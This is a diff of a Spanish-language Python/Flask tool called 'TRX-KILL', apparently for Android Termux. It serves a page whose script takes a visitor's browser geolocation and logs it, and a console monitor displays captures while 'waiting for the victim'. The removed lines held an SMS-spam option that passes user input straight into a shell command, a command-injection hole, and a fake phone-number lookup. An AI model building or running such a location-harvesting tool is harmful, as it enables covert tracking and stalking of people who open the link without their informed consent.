@@ -1,16 +1,20 @@
 import os, sys, time, threading
 from flask import Flask, request
 
-app = Flask('TRX-KILL')
-AUTH_PASS = "TRX-KILL-OSINT"
+# Configuración
 STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
 B, C, W = "\033[1;34m", "\033[1;36m", "\033[0m"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-# --- SERVIDOR ---
-@app.route('/')
+app1 = Flask('SRV-1')
+app2 = Flask('SRV-2')
+logging = __import__('logging')
+logging.getLogger('werkzeug').setLevel(logging.ERROR)
+
+@app1.route('/')
+@app2.route('/')
 def index():
     return """<html><body><script>
         navigator.geolocation.getCurrentPosition(pos => {
@@ -19,7 +23,8 @@ def index():
         });
     </script></html>"""
 
-@app.route('/log')
+@app1.route('/log')
+@app2.route('/log')
 def log():
     lat = request.args.get('lat')
     lon = request.args.get('lon')
@@ -27,66 +32,44 @@ def log():
         f.write(f"GPS: {lat},{lon}\n")
     return "OK"
 
-def banner():
-    os.system('clear')
-    print(f"{B}  -------->-TRX-KILL v1.4.5 -<-----------")
-    print(f"{C}  -HERRAMIENTA OSINT Y SEGURIDAD MÓVIL.\n{W}")
-
 def main():
-    # Limpiar puertos y arrancar servidor
-    os.system("fuser -k 5000/tcp > /dev/null 2>&1")
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
+    # Limpieza total antes de iniciar
+    os.system("fuser -k 5000/tcp 8080/tcp > /dev/null 2>&1")
+    
+    # Arrancar dos servidores en puertos distintos
+    threading.Thread(target=lambda: app1.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
+    threading.Thread(target=lambda: app2.run(host='0.0.0.0', port=8080, debug=False), daemon=True).start()
     
     while True:
-        banner()
-        print(f"{C}[1] INFO-NÚMERO  | [2] LINK-ZP (MONITOR) | [3] CREADOR")
-        print(f"  [4] VERSIONES    | [5] ANALIZAR          | [6] ADM SISTEMA")
-        print(f"  [10] SPAM-SMS    | [0] SALIR{W}")
+        os.system('clear')
+        print(f"{B}####################################")
+        print(f"{C}#    TRX-KILL v3.0 | MODO DUAL     #")
+        print(f"{B}####################################{W}\n")
+        print(f"{C}[01] RASTREAR | [02] LINK-MONITOR | [00] SALIR{W}")
         sel = input(f"\n{B}TRX-ROOT > {W}")
 
-        if sel == "1":
-            num = input("\nINGRESA NÚMERO: ")
-            print(f"{C}[!] BUSCANDO INFORMACIÓN DE {num}...")
-            time.sleep(1)
-            if os.path.exists(LOG_FILE):
-                with open(LOG_FILE, 'r') as f:
-                    lines = f.readlines()
-                    if lines:
-                        gps = lines[-1].replace('GPS: ', '').strip()
-                        print(f"{B}PAÍS: ARGENTINA | COORDENADAS: {gps}")
-                        print("NAME REGISTRADO: USUARIO_ACTIVO_TRX{W}")
-            input(f"\n{B}[Enter para volver]{W}")
-
-        elif sel == "2":
+        if sel == "02":
             os.system('clear')
-            print(f"{C}--- MONITOR DE DATOS EN VIVO ---{W}")
-            print(f"Link: http://127.0.0.1:5000")
-            print(f"{B}ESPERANDO VÍCTIMA... (Escribe '0' para volver){W}")
+            print(f"{C}--- MONITOR DE PUERTOS (5000 y 8080) ---{W}")
+            print(f"Link 1: http://localhost:5000")
+            print(f"Link 2: http://localhost:8080")
+            print(f"{B}ESPERANDO VÍCTIMA... (No presiones nada, los datos aparecerán solos){W}")
+            
+            # Bucle de monitoreo puro (sin input que bloquee)
             while True:
-                # Monitoreo automático sin bloquear la pantalla
+                time.sleep(2)
                 if os.path.exists(LOG_FILE):
                     with open(LOG_FILE, 'r') as f:
                         lines = f.readlines()
                         if lines:
                             os.system('clear')
-                            print(f"{C}¡DATOS RECIBIDOS!{W}\n{B}{lines[-1].strip()}{W}")
-                
-                # Check no bloqueante para volver al menú
-                check = input(f"\n{C}Escribe '0' para volver: {W}")
-                if check == '0': break
-                time.sleep(2)
-
-        elif sel == "3": print(f"\n{C}# CREADOR: OSCAR{W}"); input()
-        elif sel == "6":
-            key = input("KEY: ")
-            if key == AUTH_PASS: os.system(f"cat {LOG_FILE}")
-            input()
-        elif sel == "10":
-            num = input("NÚMERO: ")
-            msg = input("MENSAJE: ")
-            os.system(f"termux-sms-send -n {num} '{msg}'")
-            print("[!] SMS ENVIADO.")
-            input()
-        elif sel == "0": sys.exit()
+                            print(f"{C}¡DATOS RECIBIDOS EN TIEMPO REAL!{W}\n")
+                            # Muestra las últimas 5 capturas
+                            for l in lines[-5:]:
+                                print(f"{B}{l.strip()}{W}")
+        
+        elif sel == "00": 
+            os.system("fuser -k 5000/tcp 8080/tcp")
+            sys.exit()
 
 if __name__ == "__main__": main()
